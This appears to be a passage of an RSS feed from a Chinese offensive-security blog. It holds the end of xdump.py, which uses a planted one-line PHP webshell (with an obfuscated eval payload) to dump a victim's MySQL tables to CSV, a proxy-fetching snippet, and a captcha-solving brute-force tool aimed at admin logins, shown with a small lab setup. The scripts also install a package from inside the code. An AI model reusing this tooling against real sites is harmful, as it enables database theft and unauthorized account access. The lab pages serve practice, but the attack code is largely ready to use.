oX3JvdygkcSkpe2ZvcigkYz0wOyRjPCRpOyRjKyspe2VjaG8odHJpbSgkcnNbJGNdKSk7ZWNobygiXHR8XHQiKTt9ZWNobygiXHJcbiIpO31AbXlzcWxfY2xvc2UoJFQpOztlY2hvKCJ8PC0iKTtkaWUoKTs=&quot;
        postData['z1'] = dbHost
        postData['z2'] = dbUser
        postData['z3'] = dbPass
        postData['z4'] = dbName
        postData[
            chopperPass] = &quot;$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval($xx($yy[z0]));&quot;

        httpHeaderContent = get_random_header()
        httpHeaderContent['Referer'] = get_http_domain_from_url(url)
        httpHeaderContent['Content-Type'] = &quot;application/x-www-form-urlencoded&quot;

    else:
        postData[&quot;z4&quot;] = dbName

    postData[&quot;z5&quot;] = base64.b64encode(queryString.encode(encoding=&quot;utf-8&quot;))
    result = post_requests(url, data=postData, headers=httpHeaderContent)
    html = result.content.decode(&quot;utf8&quot;)
    return html[3:-3]


def main():
    os.system(&quot;pip3 install exp10it -U&quot;)
    global httpHeaderContent, postData, headerFile, postDataFile, everyQueryCount, count, dbHost,dbUser,dbPass, dbName, tableName, url, chopperPass, mode,countOfTableDict,primaryColumnName
    # count是第几次查询
    httpHeaderContent = {}
    postData = {}
    url = input(&quot;please input webshell url:&quot;)
    chopperPass = input(&quot;please input your webshell pass:&quot;)
    print(&quot;1.不抓包模式\nor\n2.抓包后模式?\n不抓包模式目前只测试过php+mysql组合 抓包后模式功能更强大\
[但是需要用charles做sock5代理,proxfier设置chopper的代理为charles提供的对应的代理地址,用charles抓到chopper\
的包后按照代码中要求的格式保存到下面要提供的文件中]\n请选择对应模式序号,默认选择1&quot;)
    mode = get_input_intime(1)
    if str(mode) == &quot;1&quot;:
        dbHost = input(&quot;please input db host:\n&quot;)
        dbUser = input(&quot;please inpuot db user:\n&quot;)
        dbPass = input(&quot;please input db pass:\n&quot;)
        dbName = input(&quot;please input db name:\n&quot;)
    else:
        headerFile = input(&quot;please input your post header file abspath,header头要求如代码中的示例格式:\n&quot;)
        postDataFile = input(&quot;please input your post data file abspath,post数据要求如代码中的示例格式:\n&quot;)
        with open(headerFile, &quot;r+&quot;) as f:
            for eachLine in f:
                eachLine = re.sub(&quot;\s$&quot;, &quot;&quot;, eachLine)
                eachHeaderParam = eachLine.split(&quot;:&quot;)[0]
                eachHeaderParamValue = eachLine[len(eachHeaderParam) + 1:]
                httpHeaderContent[eachHeaderParam] = eachHeaderParamValue

        with open(postDataFile, &quot;r+&quot;) as f:
            for eachLine in f:
                eachLine = re.sub(&quot;\s$&quot;, &quot;&quot;, eachLine)
                eachPostParam = eachLine.split(&quot;=&quot;)[0]
                eachPostParamValue = eachLine[len(eachPostParam) + 1:]
                postData[eachPostParam] = eachPostParamValue

    while 1:
        if mode == 1:
            pass
        else:
            dbName = postData['z4']
        result = query(&quot;show databases&quot;)
        print(&quot;you are accessed on below database:\n&quot;)
        pureData = result[len(result.split(&quot;\r\n&quot;)[0] + &quot;\r\n&quot;):]
        list = re.findall(&quot;([^\s\|]+)&quot;, pureData)
        for eachDbname in list:
            print(eachDbname)
        dbName = input(&quot;\nplease input db name you want to dump data from:\n&quot;)
        print(&quot;\nthe db you choosed has below tables:\n&quot;)
        if countOfTableDict=={}:
            result = query(&quot;show tables&quot;)

            pureData = result[len(result.split(&quot;\r\n&quot;)[0] + &quot;\r\n&quot;):]
            list = re.findall(&quot;([^\s\|]+)&quot;, pureData)
            for eachTableName in list:
                result = query(&quot;select count(*) from %s&quot; % eachTableName)
                entryNum = re.search(&quot;(\d+)&quot;, result).group(1)
                countOfTableDict[eachTableName]=int(entryNum)
                #print(eachTableName)

        for eachTableName in countOfTableDict:
            print(eachTableName+&quot;[%d]&quot; % int(countOfTableDict[eachTableName]))

        tableName = input(&quot;\nplease input table name you want to dump:\n&quot;)

        totalDataCount = int(input(&quot;please input how much data there are[想dump多少条数据?输入0代表dump整个表的内容]:\n&quot;))
        everyQueryCount = int(
            input(&quot;please input how much data do you want to query each time[每次要查询多少条数据?]:\n&quot;))
        # 下面是一共要查询的次数
        totalQueryCount = totalDataCount // everyQueryCount

        #下面尝试选择可用于脱库的主键
        primaryColumnName=getPrimaryColumnName()


        if totalQueryCount!=0:
            for i in range(totalQueryCount):
                # 下面是每次查询完后对查询参数的改变函数
                HandlePostData()

                result = post_requests(url, data=postData, headers=httpHeaderContent)
                html = result.content.decode(&quot;utf8&quot;)[3:-3]
                #print(html)
                # 菜刀中的数据是\r\n换行,如果是用大马中的post数据则有可能是\n换行符,菜刀版本不一样也有可能会是\n换行符,这里
                # 的返回的sql数据中是\r\n换行符,不同情况时这里要修改
                firstLine = html.split(&quot;\r\n&quot;)[0]
                # 第一行中以-&amp;gt;|开头,最后一行为|&amp;lt;-
                firstLine2write = firstLine[3:]
                data2write = html[len(firstLine + &quot;\r\n&quot;):-3]
                with open(&quot;%s.csv&quot; % tableName, &quot;a+&quot;) as f:
                    if count == 0:
                        f.write(firstLine2write + &quot;\r\n&quot;)
                    # 这里每次查询2000条数据,要在post文件的数据中将对应数据修改成每次要查询的条数
                    count += 1
                    num = count * everyQueryCount
                    print(&quot;查询了%d条数据&quot; % num)
                    f.write(&quot;\r\n下面是到%d条数据:\r\n&quot; % num)
                    f.write(data2write)
        else:
            while 1:
                # 下面是每次查询完后对查询参数的改变函数
                HandlePostData()

                result = post_requests(url, data=postData, headers=httpHeaderContent)
                html = result.content.decode(&quot;utf8&quot;)[3:-3]
                #print(html)
                # 菜刀中的数据是\r\n换行,如果是用大马中的post数据则有可能是\n换行符,菜刀版本不一样也有可能会是\n换行符,这里
                # 的返回的sql数据中是\r\n换行符,不同情况时这里要修改
                firstLine = html.split(&quot;\r\n&quot;)[0]
                # 第一行中以-&amp;gt;|开头,最后一行为|&amp;lt;-
                firstLine2write = firstLine[3:]
                data2write = html[len(firstLine + &quot;\r\n&quot;):-3]
                with open(&quot;%s.csv&quot; % tableName, &quot;a+&quot;) as f:
                    if count == 0:
                        f.write(firstLine2write + &quot;\r\n&quot;)
                    # 这里每次查询2000条数据,要在post文件的数据中将对应数据修改成每次要查询的条数
                    count += 1
                    num = start+everyQueryCount-1
                    print(&quot;查询了%d条数据&quot; % num)
                    f.write(&quot;\r\n下面是到%d条数据:\r\n&quot; % num)
                    f.write(data2write)

                


if __name__ == '__main__':
    print(&quot;[!] legal disclaimer: Usage of xdump.py for attacking targets without prior mutual consent is \
illegal.It is the end user's responsibility to obey all applicable local, state and federal laws. \
Developers assume no liability and are not responsible for any misuse or damage caused by this program&quot;)
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 25 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/web/2016/11/25/%E4%B8%80%E5%8F%A5%E8%AF%9Dwebshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%84%B1%E5%BA%93/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/11/25/%E4%B8%80%E5%8F%A5%E8%AF%9Dwebshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%84%B1%E5%BA%93/</guid>
        
        <category>webshell</category>
        
        <category>dump</category>
        
        <category>sql</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>获取代理</title>
        <description>&lt;h3 id=&quot;pycode&quot;&gt;pycode&lt;/h3&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pip3 install exp10it -U&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;exp10it&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_one_useful_proxy&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_one_useful_proxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 16 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/python/2016/11/16/%E8%8E%B7%E5%8F%96%E4%BB%A3%E7%90%86/</link>
        <guid isPermaLink="true">http://localhost:4000/python/2016/11/16/%E8%8E%B7%E5%8F%96%E4%BB%A3%E7%90%86/</guid>
        
        <category>proxy</category>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>自动识别验证码暴力破解</title>
        <description>&lt;h3 id=&quot;0x00-环境准备&quot;&gt;0x00 环境准备&lt;/h3&gt;

&lt;p&gt;admin.php,yanzhengma.php,check_login.php&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin.php:管理员登录页面  
yanzhengma.php:验证码生成页面  
check_login.php:用户名密码和验证码核对页面  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;admin.php内容如下:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- DOCTYPE html PUBLIC &quot;-//WAPFORUM//DTD XHTML Mobile 1.0//EN&quot; &quot;http://www.wapforum.org/DTD/xhtml-mobile10.dtd&quot; --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/1999/xhtml&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/html; charset=utf-8&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
 
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;check_login.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
username:&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
password:&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;code&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkpic&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yanzhengma.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;看不清楚,换一张&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cursor: pointer; vertical-align:middle;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onClick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;changing()&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--&amp;lt;button type=&quot;button&quot; onClick=&quot;create_code()&quot;&amp;gt;更换&amp;lt;/button&amp;gt;--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;提交&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;changing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'checkpic'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yanzhengma.php?&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;yanzhengma.php内容如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

session_start();
function random($len) {
		$srcstr = &quot;1a2s3d4f5g6hj8k9qwertyupzxcvbnm&quot;;
		mt_srand();
		$strs = &quot;&quot;;
		for ($i = 0; $i &amp;lt; $len; $i++) {
				$strs .= $srcstr[mt_rand(0, 30)];
		}
		return $strs;
}

//随机生成的字符串
$str = random(4);

//验证码图片的宽度
$width  = 50;

//验证码图片的高度
$height = 25;

//声明需要创建的图层的图片格式
@ header(&quot;Content-Type:image/png&quot;);

//创建一个图层
$im = imagecreate($width, $height);

//背景色
$back = imagecolorallocate($im, 0xFF, 0xFF, 0xFF);

//模糊点颜色
//$pix  = imagecolorallocate($im, 187, 230, 247);

//字体色
//$font = imagecolorallocate($im, 41, 163, 238);
$font = imagecolorallocate($im, 0, 0, 0);

//绘模糊作用的点
//mt_srand();
//for ($i = 0; $i &amp;lt; 1000; $i++) {
//    imagesetpixel($im, mt_rand(0, $width), mt_rand(0, $height), $pix);
//}

//输出字符
imagestring($im, 5, 7, 5, $str, $font);

//输出矩形(对图像识别杀伤大)
//imagerectangle($im, 0, 0, $width -1, $height -1, $font);

//输出图片
imagepng($im);

imagedestroy($im);

//$str = md5($str);

//选择 cookie
//SetCookie(&quot;verification&quot;, $str, time() + 7200, &quot;/&quot;);

//选择 Session
$_SESSION[&quot;verification&quot;] = $str;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;check_login.php页面内容如下:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'session:'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;verification&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'code:'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'code'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'code'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;verification&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pass'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'woaini'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Congratulations! you have break it,good job&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;//header(&quot;Location: https://3xp10it.cc&quot;);
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'no'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-xadminpy&quot;&gt;0x01 xadmin.py&lt;/h3&gt;

&lt;p&gt;usage:
	python3 xadmin.py http://localhost/admin.php&lt;/p&gt;

&lt;p&gt;xadmin.py为爆破代码,内容如下:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;concurrent&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;futures&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pip3 install exp10it -U&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;exp10it&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CLIOutput&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;exp10it&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;figlet2file&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;exp10it&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_user_and_pass_form_from_url&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;exp10it&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_yanzhengma_form_and_src_from_url&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;exp10it&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_string_from_url_or_picfile&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;exp10it&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ModulePath&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;exp10it&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_remain_time&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;crack_admin_login_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;user_dict_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ModulePath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;dicts/user.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pass_dict_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ModulePath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;dicts/pass.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;yanzhengma_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# 这里的yanzhengma_len是要求的验证码长度,默认不设置,自动获得,根据不同情况人为设置不同值效果更好&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# 爆破管理员后台登录url,尝试自动识别验证码,如果管理员登录页面没有验证码,加了任意验证码数据也可通过验证&lt;/span&gt;
